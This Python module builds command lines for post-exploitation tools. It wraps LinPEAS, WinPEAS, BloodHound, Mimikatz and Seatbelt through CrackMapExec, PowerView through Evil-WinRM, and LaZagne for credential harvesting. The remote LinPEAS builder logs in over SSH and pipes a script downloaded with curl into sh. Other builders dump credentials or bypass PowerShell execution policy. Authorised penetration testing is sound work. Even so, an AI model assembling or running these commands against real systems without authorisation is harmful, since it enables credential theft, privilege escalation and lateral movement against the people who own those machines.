"""
Command builders for post-exploitation tooling.
"""

from typing import List, Optional

LINPEAS_PATH = '/opt/PEASS-ng/linPEAS/linpeas.sh'
WINPEAS_PATH = '/opt/PEASS-ng/winPEAS/winPEASx64.exe'
LAZAGNE_PATH = '/opt/LaZagne/Linux/laZagne.py'


def linpeas_command(
    local: bool,
    target: Optional[str],
    ssh_user: Optional[str],
    ssh_pass: Optional[str]
) -> List[str]:
    """Return command for LinPEAS execution."""
    if local:
        return [LINPEAS_PATH, '-a']
    if not target or not ssh_user or not ssh_pass:
        raise ValueError('Remote LinPEAS requires target, ssh_user and ssh_pass')
    return [
        'sshpass', '-p', ssh_pass,
        'ssh', f'{ssh_user}@{target}',
        'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'
    ]


def winpeas_command(
    local: bool,
    target: str,
    username: Optional[str],
    password: Optional[str]
) -> List[str]:
    """Return command for WinPEAS execution."""
    if local:
        return [
            'powershell', '-ExecutionPolicy', 'Bypass',
            '-File', WINPEAS_PATH
        ]
    if not username or not password:
        raise ValueError('Remote WinPEAS requires credentials')
    return [
        'crackmapexec', 'smb', target,
        '-u', username,
        '-p', password,
        '-M', 'pe_inject',
        '-o', f'BIN={WINPEAS_PATH}'
    ]


def bloodhound_command(
    domain: str,
    username: str,
    password: str,
    collection_method: str,
    dc_ip: Optional[str]
) -> List[str]:
    """Return command for BloodHound collection."""
    command = [
        'bloodhound-python',
        '-u', username,
        '-p', password,
        '-d', domain,
        '-c', collection_method,
        '--zip',
    ]
    nameserver = dc_ip or domain
    command.extend(['-ns', nameserver])
    return command


def mimikatz_command(
    target: str,
    username: str,
    password: str,
    command: str
) -> List[str]:
    """Return command for Mimikatz via CrackMapExec."""
    return [
        'crackmapexec', 'smb', target,
        '-u', username,
        '-p', password,
        '-M', 'mimikatz',
        '-o', f'COMMAND="{command}"'
    ]


def powerview_command(
    target: str,
    username: str,
    password: str,
    command: str
) -> List[str]:
    """Return command for PowerView via Evil-WinRM."""
    return [
        'evil-winrm',
        '-i', target,
        '-u', username,
        '-p', password,
        '-s', '/opt/PowerSploit/Recon/',
        '-e', '/opt/PowerSploit/Recon/PowerView.ps1',
        '-c', command
    ]


def seatbelt_command(
    target: str,
    username: str,
    password: str,
    group: str
) -> List[str]:
    """Return command for Seatbelt via CrackMapExec."""
    return [
        'crackmapexec', 'smb', target,
        '-u', username,
        '-p', password,
        '-M', 'seatbelt',
        '-o', f'GROUP={group}'
    ]


def lazagne_command(mode: str) -> List[str]:
    """Return command for LaZagne."""
    selected_mode = mode if mode else 'all'
    return [
        'python3',
        LAZAGNE_PATH,
        '--mode',
        selected_mode
    ]


